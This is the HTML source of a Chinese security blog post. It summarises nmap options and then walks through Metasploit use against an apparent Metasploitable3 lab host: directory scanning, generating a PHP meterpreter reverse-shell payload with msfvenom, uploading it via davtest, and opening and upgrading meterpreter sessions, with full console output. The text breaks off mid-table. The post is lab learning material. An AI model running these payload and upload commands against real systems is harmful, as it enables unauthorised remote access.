@@ -1,0 +1,1350 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=6.5.0" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.5.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/02.png?v=6.5.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/02.png?v=6.5.0">
+
+
+  <link rel="mask-icon" href="/images/02.png?v=6.5.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '6.5.0',
+    sidebar: {"position":"right","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="nmap常见参数HOST DISCOVERY主机发现 -sL：简单列出扫描的目标 -sn：不做端口扫描，只进行主机发现 -PS/PA/PU/PY[portlist]：使用TCP、SYN/ACK、UDP或SCTP去发现端口 -n：不做DNS解析 -R：总是做DNS反向解析">
+<meta property="og:type" content="article">
+<meta property="og:title" content="nmap及msf的一些操作">
+<meta property="og:url" content="https://cy9nusg4rd3n.github.io/2019/02/03/nmap及msf的一些操作/index.html">
+<meta property="og:site_name" content="Cy9nus&#39;s Blog">
+<meta property="og:description" content="nmap常见参数HOST DISCOVERY主机发现 -sL：简单列出扫描的目标 -sn：不做端口扫描，只进行主机发现 -PS/PA/PU/PY[portlist]：使用TCP、SYN/ACK、UDP或SCTP去发现端口 -n：不做DNS解析 -R：总是做DNS反向解析">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2020-04-03T15:28:47.819Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="nmap及msf的一些操作">
+<meta name="twitter:description" content="nmap常见参数HOST DISCOVERY主机发现 -sL：简单列出扫描的目标 -sn：不做端口扫描，只进行主机发现 -PS/PA/PU/PY[portlist]：使用TCP、SYN/ACK、UDP或SCTP去发现端口 -n：不做DNS解析 -R：总是做DNS反向解析">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Cy9nus's Blog" type="application/atom+xml">
+
+
+
+
+  <link rel="canonical" href="https://cy9nusg4rd3n.github.io/2019/02/03/nmap及msf的一些操作/">
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>nmap及msf的一些操作 | Cy9nus's Blog</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-right page-post-detail">
+    <div class="headband"></div>
+	
+    <a href="https://github.com/Cy9nusG4rd3n/Cy9nusG4rd3n.github.io"><img style="position: absolute; top: 0; right: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_right_darkblue_121621.png" alt="Fork me on GitHub"></a>
+    
+	<header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Cy9nus's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">人如果没有梦想，跟咸鱼有什么区别</p>
+      
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+  
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://cy9nusg4rd3n.github.io/2019/02/03/nmap及msf的一些操作/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Cy9nus">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/header.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Cy9nus's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">nmap及msf的一些操作
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-02-03 06:16:30" itemprop="dateCreated datePublished" datetime="2019-02-03T06:16:30+08:00">2019-02-03</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2020-04-03 23:28:47" itemprop="dateModified" datetime="2020-04-03T23:28:47+08:00">2020-04-03</time>
+              
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/02/03/nmap及msf的一些操作/#comments" itemprop="discussionUrl">
+                  <span class="post-meta-item-text">评论数：</span> <span class="post-comments-count valine-comment-count" data-xid="/2019/02/03/nmap及msf的一些操作/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon">
+            <i class="fa fa-eye"></i>
+             阅读次数： 
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="nmap常见参数"><a href="#nmap常见参数" class="headerlink" title="nmap常见参数"></a>nmap常见参数</h1><h2 id="HOST-DISCOVERY主机发现"><a href="#HOST-DISCOVERY主机发现" class="headerlink" title="HOST DISCOVERY主机发现"></a>HOST DISCOVERY主机发现</h2><ul>
+<li>-sL：简单列出扫描的目标</li>
+<li>-sn：不做端口扫描，只进行主机发现</li>
+<li>-PS/PA/PU/PY[portlist]：使用TCP、SYN/ACK、UDP或SCTP去发现端口</li>
+<li>-n：不做DNS解析</li>
+<li>-R：总是做DNS反向解析<a id="more"></a>
+</li>
+</ul>
+<h2 id="SCAN-TECHNIQUES扫描技术"><a href="#SCAN-TECHNIQUES扫描技术" class="headerlink" title="SCAN TECHNIQUES扫描技术"></a>SCAN TECHNIQUES扫描技术</h2><ul>
+<li>-sS/sT/sA/sW/sM：使用TCP SYN、全连接Connect()、ACK、Window、Maimon来进行扫描</li>
+<li>-sU：UDP扫描</li>
+<li>-sO：进行IP协议扫描</li>
+</ul>
+<h2 id="PORT-SPECIFICATION-AND-SCAN-ORDER端口说明和扫描规则"><a href="#PORT-SPECIFICATION-AND-SCAN-ORDER端口说明和扫描规则" class="headerlink" title="PORT SPECIFICATION AND SCAN ORDER端口说明和扫描规则"></a>PORT SPECIFICATION AND SCAN ORDER端口说明和扫描规则</h2><ul>
+<li>-p <port ranges="">：只扫描指定的端口</port></li>
+<li>-F：快速模式，扫描比默认端口数量更少的端口</li>
+<li>–top-ports <number>：扫描排名指定的数字前几位的最常用的端口</number></li>
+<li>–port-ratio <ratio>：扫描比输入的比例更常用的端口</ratio></li>
+</ul>
+<h2 id="SERVICE-VERSION-DETECTION服务、版本探测"><a href="#SERVICE-VERSION-DETECTION服务、版本探测" class="headerlink" title="SERVICE/VERSION DETECTION服务、版本探测"></a>SERVICE/VERSION DETECTION服务、版本探测</h2><ul>
+<li>-sV：探测开启的端口来获取服务、版本信息</li>
+</ul>
+<h2 id="OS-DETECTION系统探测"><a href="#OS-DETECTION系统探测" class="headerlink" title="OS DETECTION系统探测"></a>OS DETECTION系统探测</h2><ul>
+<li>-O：进行系统探测</li>
+</ul>
+<h2 id="OUTPUT输出"><a href="#OUTPUT输出" class="headerlink" title="OUTPUT输出"></a>OUTPUT输出</h2><ul>
+<li>-v：增加的详细程度（使用VV更详细）</li>
+</ul>
+<h2 id="MISC杂项"><a href="#MISC杂项" class="headerlink" title="MISC杂项"></a>MISC杂项</h2><ul>
+<li>-6：扫描IPv6的地址</li>
+<li>-A：一次扫描包含系统探测、版本探测、脚本扫描和跟踪扫描</li>
+<li>-V：输出版本号</li>
+</ul>
+<h1 id="msf目录扫描"><a href="#msf目录扫描" class="headerlink" title="msf目录扫描"></a>msf目录扫描</h1><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use auxiliary/scanner/http/dir_scanner </span><br><span class="line">msf5 auxiliary(scanner/http/dir_scanner) &gt; show <span class="keyword">options</span> </span><br><span class="line"></span><br><span class="line">Module <span class="keyword">options</span> (auxiliary/scanner/http/dir_scanner):</span><br><span class="line"></span><br><span class="line">   Name        Current Setting                                          Required  Description</span><br><span class="line">   ----        ---------------                                          --------  -----------</span><br><span class="line">   DICTIONARY  /usr/share/metasploit-framework/data/wmap/wmap_dirs.txt  <span class="keyword">no</span>        Path of word dictionary to use</span><br><span class="line">   PATH        /                                                        <span class="keyword">yes</span>       The path  to identify <span class="keyword">files</span></span><br><span class="line">   Proxies                                                              <span class="keyword">no</span>        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOSTS                                                               <span class="keyword">yes</span>       The target address range <span class="keyword">or</span> CIDR identifier</span><br><span class="line">   RPORT       <span class="number">80</span>                                                       <span class="keyword">yes</span>       The target port (TCP)</span><br><span class="line">   SSL         false                                                    <span class="keyword">no</span>        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   THREADS     <span class="number">1</span>                                                        <span class="keyword">yes</span>       The number of concurrent threads</span><br><span class="line">   VHOST                                                                <span class="keyword">no</span>        HTTP server virtual host</span><br><span class="line"></span><br><span class="line">msf5 auxiliary(scanner/http/dir_scanner) &gt; <span class="keyword">set</span> rhosts <span class="comment">192.168.1.44</span></span><br><span class="line">rhosts <span class="comment">=&gt; 192.168.1.44</span></span><br><span class="line">msf5 <span class="comment">auxiliary(scanner</span>/http/<span class="comment">dir_scanner) &gt; set threads 30</span></span><br><span class="line">threads <span class="comment">=&gt; 30</span></span><br><span class="line">msf5 <span class="comment">auxiliary(scanner</span>/http/<span class="comment">dir_scanner) &gt; run</span></span><br><span class="line"></span><br><span class="line">[*] Detecting <span class="comment">error code</span></span><br><span class="line">[*] Using <span class="comment">code</span> <span class="comment">'404'</span><span class="comment"> as not found for 192.168.1.44</span></span><br><span class="line">[+] Found <span class="comment">http:</span>//<span class="comment">192.168.1.44:80</span>/cgi-bin/<span class="comment"> 404 (192.168.1.44)</span></span><br><span class="line">[+] Found <span class="comment">http:</span>//<span class="comment">192.168.1.44:80</span>/doc/<span class="comment"> 200 (192.168.1.44)</span></span><br><span class="line">[+] Found <span class="comment">http:</span>//<span class="comment">192.168.1.44:80</span>/icons/<span class="comment"> 200 (192.168.1.44)</span></span><br><span class="line">[+] Found <span class="comment">http:</span>//<span class="comment">192.168.1.44:80</span>/index/<span class="comment"> 404 (192.168.1.44)</span></span><br><span class="line">[+] Found <span class="comment">http:</span>//<span class="comment">192.168.1.44:80</span>/phpMyAdmin/<span class="comment"> 200 (192.168.1.44)</span></span><br><span class="line">[+] Found <span class="comment">http:</span>//<span class="comment">192.168.1.44:80</span>/test/<span class="comment"> 404 (192.168.1.44)</span></span><br><span class="line">[*] Scanned <span class="comment">1 of 1 hosts (100% complete)</span></span><br><span class="line">[*] Auxiliary <span class="comment">module execution completed</span></span><br></pre></td></tr></table></figure>
+<h1 id="msf反弹shell（桥接模式下）"><a href="#msf反弹shell（桥接模式下）" class="headerlink" title="msf反弹shell（桥接模式下）"></a>msf反弹shell（桥接模式下）</h1><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1. </span>msfvenom -p php/meterpreter<span class="emphasis">_reverse_</span>tcp LHOST=192.168.75.128 LPORT=62222 -f raw &gt; ~/Desktop/62222.php</span><br><span class="line"><span class="bullet">2. </span>davtest -url http://192.168.1.66:8585/uploads -uploadfile ~/Desktop/62222.php -uploadloc 62222.php</span><br><span class="line"><span class="bullet">3. </span>use exploit/multi/handler </span><br><span class="line"><span class="bullet">4. </span>set payload php/meterpreter<span class="emphasis">_reverse_</span>tcp </span><br><span class="line"><span class="bullet">5. </span>show options</span><br><span class="line"><span class="bullet">6. </span>run</span><br></pre></td></tr></table></figure>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">Started</span> <span class="selector-tag">reverse</span> <span class="selector-tag">TCP</span> <span class="selector-tag">handler</span> <span class="selector-tag">on</span> 192<span class="selector-class">.168</span><span class="selector-class">.1</span><span class="selector-class">.181</span><span class="selector-pseudo">:61111</span> </span><br><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">Meterpreter</span> <span class="selector-tag">session</span> 1 <span class="selector-tag">opened</span> (192<span class="selector-class">.168</span><span class="selector-class">.1</span><span class="selector-class">.181</span><span class="selector-pseudo">:61111</span> <span class="selector-tag">-</span>&gt; 192<span class="selector-class">.168</span><span class="selector-class">.1</span><span class="selector-class">.66</span><span class="selector-pseudo">:53920)</span> <span class="selector-tag">at</span> 2019<span class="selector-tag">-01-22</span> 13<span class="selector-pseudo">:34</span><span class="selector-pseudo">:42</span> +0800</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">meterpreter</span> &gt;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>getuid查看用户</li>
+<li>background(把会话放置后台)</li>
+<li>sessions -l </li>
+</ul>
+<h1 id="利用ms18-8120提权"><a href="#利用ms18-8120提权" class="headerlink" title="利用ms18-8120提权"></a>利用ms18-8120提权</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/<span class="keyword">handler</span>) &gt; <span class="keyword">set</span> payload php/meterpreter_reverse_tcp</span><br><span class="line">payload =&gt; php/meterpreter_reverse_tcp</span><br><span class="line">msf5 exploit(multi/<span class="keyword">handler</span>) &gt; <span class="keyword">show</span> options </span><br><span class="line"></span><br><span class="line"><span class="keyword">Module</span> options (exploit/multi/<span class="keyword">handler</span>):</span><br><span class="line"></span><br><span class="line">   <span class="keyword">Name</span>  <span class="keyword">Current</span> Setting  <span class="keyword">Required</span>  Description</span><br><span class="line">   <span class="comment">----  ---------------  --------  -----------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (php/meterpreter_reverse_tcp):</span><br><span class="line"></span><br><span class="line">   <span class="keyword">Name</span>   <span class="keyword">Current</span> Setting  <span class="keyword">Required</span>  Description</span><br><span class="line">   <span class="comment">----   ---------------  --------  -----------</span></span><br><span class="line">   LHOST  <span class="number">192.168</span><span class="number">.1</span><span class="number">.66</span>     yes       The listen address (an <span class="keyword">interface</span> may be specified)</span><br><span class="line">   LPORT  <span class="number">61111</span>            yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   <span class="keyword">Id</span>  <span class="keyword">Name</span></span><br><span class="line">   <span class="comment">--  ----</span></span><br><span class="line">   <span class="number">0</span>   Wildcard Target</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/<span class="keyword">handler</span>) &gt; <span class="keyword">set</span> lhost <span class="number">192.168</span><span class="number">.1</span><span class="number">.181</span></span><br><span class="line">lhost =&gt; <span class="number">192.168</span><span class="number">.1</span><span class="number">.181</span></span><br><span class="line">msf5 exploit(multi/<span class="keyword">handler</span>) &gt; <span class="keyword">set</span> lport <span class="number">31111</span></span><br><span class="line">lport =&gt; <span class="number">31111</span></span><br><span class="line">msf5 exploit(multi/<span class="keyword">handler</span>) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started <span class="keyword">reverse</span> TCP <span class="keyword">handler</span> <span class="keyword">on</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.181</span>:<span class="number">31111</span> </span><br><span class="line">[*] Meterpreter <span class="keyword">session</span> <span class="number">1</span> opened (<span class="number">192.168</span><span class="number">.1</span><span class="number">.181</span>:<span class="number">31111</span> -&gt; <span class="number">192.168</span><span class="number">.1</span><span class="number">.66</span>:<span class="number">51745</span>) <span class="keyword">at</span> <span class="number">2019</span><span class="number">-01</span><span class="number">-22</span> <span class="number">15</span>:<span class="number">59</span>:<span class="number">07</span> +<span class="number">0800</span></span><br><span class="line"></span><br><span class="line">meterpreter &gt; pwd</span><br><span class="line">C:\wamp\www\uploads</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line"><span class="keyword">Server</span> username: <span class="keyword">LOCAL</span> SERVICE (<span class="number">0</span>)</span><br><span class="line">meterpreter &gt; background </span><br><span class="line">[*] Backgrounding <span class="keyword">session</span> <span class="number">1.</span>..</span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/<span class="keyword">handler</span>) &gt; <span class="keyword">set</span> payload windows/meterpreter_reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter_reverse_tcp</span><br><span class="line">msf5 exploit(multi/<span class="keyword">handler</span>) &gt; <span class="keyword">show</span> options </span><br><span class="line"></span><br><span class="line"><span class="keyword">Module</span> options (exploit/multi/<span class="keyword">handler</span>):</span><br><span class="line"></span><br><span class="line">   <span class="keyword">Name</span>  <span class="keyword">Current</span> Setting  <span class="keyword">Required</span>  Description</span><br><span class="line">   <span class="comment">----  ---------------  --------  -----------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter_reverse_tcp):</span><br><span class="line"></span><br><span class="line">   <span class="keyword">Name</span>        <span class="keyword">Current</span> Setting  <span class="keyword">Required</span>  Description</span><br><span class="line">   <span class="comment">----        ---------------  --------  -----------</span></span><br><span class="line">   EXITFUNC    process          yes       <span class="keyword">Exit</span> technique (Accepted: <span class="string">''</span>, seh, <span class="keyword">thread</span>, process, <span class="keyword">none</span>)</span><br><span class="line">   EXTENSIONS                   <span class="keyword">no</span>        Comma-separate <span class="keyword">list</span> <span class="keyword">of</span> extensions <span class="keyword">to</span> <span class="keyword">load</span></span><br><span class="line">   EXTINIT                      <span class="keyword">no</span>        Initialization strings <span class="keyword">for</span> extensions</span><br><span class="line">   LHOST       <span class="number">192.168</span><span class="number">.1</span><span class="number">.181</span>    yes       The listen address (an <span class="keyword">interface</span> may be specified)</span><br><span class="line">   LPORT       <span class="number">31111</span>            yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   <span class="keyword">Id</span>  <span class="keyword">Name</span></span><br><span class="line">   <span class="comment">--  ----</span></span><br><span class="line">   <span class="number">0</span>   Wildcard Target</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/<span class="keyword">handler</span>) &gt; <span class="keyword">set</span> lport <span class="number">32222</span></span><br><span class="line">lport =&gt; <span class="number">32222</span></span><br><span class="line">msf5 exploit(multi/<span class="keyword">handler</span>) &gt; exploit -j -z</span><br><span class="line">[*] Exploit running <span class="keyword">as</span> background job <span class="number">1.</span></span><br><span class="line">[*] Exploit completed, but <span class="keyword">no</span> <span class="keyword">session</span> was created.</span><br><span class="line"></span><br><span class="line">[*] Started <span class="keyword">reverse</span> TCP <span class="keyword">handler</span> <span class="keyword">on</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.181</span>:<span class="number">32222</span> </span><br><span class="line">msf5 exploit(multi/<span class="keyword">handler</span>) &gt; sessions <span class="number">1</span></span><br><span class="line">[*] <span class="keyword">Starting</span> interaction <span class="keyword">with</span> <span class="number">1.</span>..</span><br><span class="line"></span><br><span class="line">meterpreter &gt; pwd</span><br><span class="line">C:\wamp\www\uploads</span><br><span class="line">meterpreter &gt; <span class="keyword">execute</span> -f <span class="string">"C:\\wamp\\www\\uploads\\32222.exe"</span></span><br><span class="line">Process <span class="number">11680</span> created.</span><br><span class="line">meterpreter &gt; [*] Meterpreter <span class="keyword">session</span> <span class="number">2</span> opened (<span class="number">192.168</span><span class="number">.1</span><span class="number">.181</span>:<span class="number">32222</span> -&gt; <span class="number">192.168</span><span class="number">.1</span><span class="number">.66</span>:<span class="number">51969</span>) <span class="keyword">at</span> <span class="number">2019</span><span class="number">-01</span><span class="number">-22</span> <span class="number">16</span>:<span class="number">02</span>:<span class="number">19</span> +<span class="number">0800</span></span><br><span class="line">meterpreter &gt; background </span><br><span class="line">[*] Backgrounding <span class="keyword">session</span> <span class="number">1.</span>..</span><br><span class="line">msf5 exploit(multi/<span class="keyword">handler</span>) &gt; sessions -l</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  <span class="keyword">Id</span>  <span class="keyword">Name</span>  <span class="keyword">Type</span>                     Information                                   <span class="keyword">Connection</span></span><br><span class="line">  <span class="comment">--  ----  ----                     -----------                                   ----------</span></span><br><span class="line">  <span class="number">1</span>         meterpreter php/windows  <span class="keyword">LOCAL</span> SERVICE (<span class="number">0</span>) @ METASPLOITABLE3           <span class="number">192.168</span><span class="number">.1</span><span class="number">.181</span>:<span class="number">31111</span> -&gt; <span class="number">192.168</span><span class="number">.1</span><span class="number">.66</span>:<span class="number">51745</span> (<span class="number">192.168</span><span class="number">.1</span><span class="number">.66</span>)</span><br><span class="line">  <span class="number">2</span>         meterpreter x86/windows  NT AUTHORITY\<span class="keyword">LOCAL</span> SERVICE @ METASPLOITABLE3  <span class="number">192.168</span><span class="number">.1</span><span class="number">.181</span>:<span class="number">32222</span> -&gt; <span class="number">192.168</span><span class="number">.1</span><span class="number">.66</span>:<span class="number">51969</span> (<span class="number">192.168</span><span 